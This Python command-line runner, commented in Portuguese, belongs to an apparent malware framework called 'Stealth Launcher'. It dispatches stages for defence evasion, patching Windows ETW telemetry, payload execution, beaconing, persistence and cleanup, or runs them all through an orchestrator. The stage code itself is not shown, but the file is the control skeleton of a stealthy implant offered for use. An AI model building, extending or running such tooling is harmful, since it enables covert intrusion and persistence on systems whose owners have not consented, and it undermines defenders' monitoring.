#!/usr/bin/env python3
"""
Entry-point CLI para executar stages individuais ou o orquestrador completo do Stealth Launcher.
"""
import argparse
import logging
import sys
from pathlib import Path

from stealth_launcher.config import load_config
from stealth_launcher.orchestrator import run

# Importa stages
from stealth_launcher.stages.evasion import evasion_stage
from stealth_launcher.stages.patching import patch_etw_stage
from stealth_launcher.stages.payload_execution import PayloadExecutor
from stealth_launcher.stages.beaconing import beaconing_stage
from stealth_launcher.stages.persistence import persistence_stage
from stealth_launcher.stages.cleanup import cleanup_stage

def main():
    logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s')

    parser = argparse.ArgumentParser(
        description="Stealth Launcher runner: execute stages individuais ou todas de uma vez"
    )
    parser.add_argument(
        'stage',
        choices=['all', 'evasion', 'patching', 'payload_execution', 'beaconing', 'persistence', 'cleanup'],
        help="Stage a executar: 'all' roda o orquestrador completo"
    )
    args = parser.parse_args()

    # Monta o caminho absoluto até stealth_launcher/stages/config/config.yaml
    base_dir = Path(__file__).resolve().parent
    config_path = base_dir / 'stages' / 'config' / 'config.yaml'

    if not config_path.exists():
        logging.error(f"Arquivo de configuração não encontrado: {config_path}")
        sys.exit(1)

    logging.info(f"Carregando configuração de: {config_path}")

    # Carrega a configuração
    cfg = load_config(str(config_path))

    # Dispara a stage escolhida
    try:
        if args.stage == 'all':
            run(cfg)
        elif args.stage == 'evasion':
            evasion_stage(cfg)
        elif args.stage == 'patching':
            patch_etw_stage(cfg)
        elif args.stage == 'payload_execution':
            executor = PayloadExecutor(cfg)
            executor.execute()
        elif args.stage == 'beaconing':
            beaconing_stage(cfg)
        elif args.stage == 'persistence':
            persistence_stage(cfg)
        elif args.stage == 'cleanup':
            cleanup_stage()
        else:
            parser.print_help()
            sys.exit(1)
    except Exception as e:
        logging.error(f"Erro durante a execução da stage '{args.stage}': {e}")
        sys.exit(1)

if __name__ == '__main__':
    main()